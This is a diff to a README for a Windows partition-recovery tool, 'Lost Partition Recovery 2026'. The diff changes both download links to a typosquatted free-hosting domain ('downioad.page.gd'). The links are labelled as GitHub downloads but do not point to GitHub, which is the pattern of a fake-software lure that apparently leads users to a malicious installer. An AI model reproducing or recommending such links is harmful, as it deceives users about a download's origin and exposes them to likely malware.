@@ -2,7 +2,7 @@
 
 Lost Partition Recovery is a comprehensive software solution designed to help users recover lost or deleted partitions on their Windows computers. In 2026, this tool has been updated with advanced algorithms to ensure high success rates in partition recovery, making it an essential utility for data restoration tasks.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -60,7 +60,7 @@ No, Lost Partition Recovery 2026 is optimized for Windows 10 and Windows 11 only
 
 For the most recent version of Lost Partition Recovery, please visit the official download page. This ensures you get all the latest features, security updates, and bug fixes.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 Last Updated: October 2026. © 2026 Lost Partition Recovery Team. All rights reserved.
 
